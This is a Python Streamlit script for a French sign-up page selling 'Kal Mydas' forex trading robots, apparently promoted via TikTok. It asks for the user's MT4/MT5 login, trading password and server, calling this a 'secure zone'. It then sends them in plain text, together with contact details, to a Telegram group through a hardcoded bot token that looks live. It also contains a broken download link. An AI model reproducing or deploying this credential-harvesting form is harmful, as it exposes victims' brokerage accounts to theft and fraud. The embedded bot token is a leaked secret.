import streamlit as st
import requests
import urllib.parse

# --- CONFIGURATION ---
TOKEN = "8529579275:AAF7jJgdaty9Ewp4KnmtHyOS5DUQgvrx0Jc"
SUPPORT_CHAT_ID = "-5279762957"

def send_telegram_notification(message):
    """Envoie le rapport dans ton groupe Telegram"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": SUPPORT_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)

# --- MISE EN PAGE DU SITE ---
st.set_page_config(page_title="Kal Mydas - Inscription", page_icon="🏛️")

st.title("🏛️ Bienvenue chez Kal Mydas")
st.write("*(Propulsé par l'IA Kairos)*")

# --- ETAPE 1 : PROFIL ---
st.header("1. Votre Profil")
profil = st.radio("Quel est votre niveau ?", ["Débutant (Guidez-moi)", "Expert (Direct)"])
tiktok = st.text_input("Votre nom sur TikTok")
# On demande un email ou tél à la place de Telegram pour les contacter hors Telegram
contact = st.text_input("Votre Email ou Téléphone (Pour vous contacter)")

# --- ETAPE 2 : OFFRE ---
st.header("2. Votre Objectif")
mode = st.radio("Type de compte", ["Compte DÉMO (Gratuit)", "Compte RÉEL (Gains)"])

capital = st.select_slider("Quel est votre capital ?", options=["0 - 5.000€", "+ 5.000€"])

robot = st.selectbox("Choisissez votre Robot", ["KalMydas HORIZON (Stable)", "KalMydas VALKYRIE (Performance)"])

# --- ETAPE 3 : TECHNIQUE (Apparaît selon choix) ---
st.header("3. Configuration Technique")

serenite = "NON"
login = "N/A"
mdp = "N/A"
serveur = "N/A"

if mode == "Compte RÉEL (Gains)":
    st.info("💎 Vous avez choisi le mode RÉEL.")
    offer_type = st.radio("Choisissez votre offre", ["PARTENAIRE (10€/mois)", "LIBERTÉ (15€/mois)"])
    
    heberge = st.checkbox("Voulez-vous l'option SÉRÉNITÉ (Hébergement sur nos serveurs) ?")
    
    if heberge:
        serenite = "OUI"
        st.warning("🔒 Zone Sécurisée pour Hébergement")
        plateforme = st.selectbox("Plateforme", ["MT4", "MT5"])
        login = st.text_input("Numéro de Compte (Login)")
        mdp = st.text_input("Mot de Passe de Trading", type="password")
        serveur = st.text_input("Nom EXACT du Serveur (ex: PUPrime-Live2)")

# --- BOUTON FINAL ---
if st.button("🚀 VALIDER MON INSCRIPTION"):
    if not contact or not tiktok:
        st.error("Merci de remplir vos informations de contact.")
    else:
        # 1. On affiche les liens de téléchargement au client SUR LE SITE
        st.success("Inscription validée ! Voici vos accès :")
        st.markdown(f"📂 [Télécharger le Dossier Complet](https://drive.google.com/...)")
        st.markdown(f"🤖 [Télécharger le Robot]({robot})")
        
        # 2. On envoie le rapport à TOI sur Telegram
        msg_support = f"""
🔥 <b>NOUVEAU CLIENT WEB</b> 🔥
➖➖➖➖➖➖➖➖➖➖
👤 <b>Contact:</b> {contact}
👤 <b>TikTok:</b> {tiktok}
➖➖➖➖➖➖➖➖➖➖
💎 <b>Mode:</b> {mode}
🤖 <b>Robot:</b> {robot}
💰 <b>Capital:</b> {capital}
🛡️ <b>Sérénité:</b> {serenite}
➖➖➖➖➖➖➖➖➖➖
🔐 <b>INFOS TECHNIQUES :</b>
Login: <code>{login}</code>
Mdp: <code>{mdp}</code>
Serveur: <code>{serveur}</code>
➖➖➖➖➖➖➖➖➖➖
        """
        send_telegram_notification(msg_support)
        st.balloons()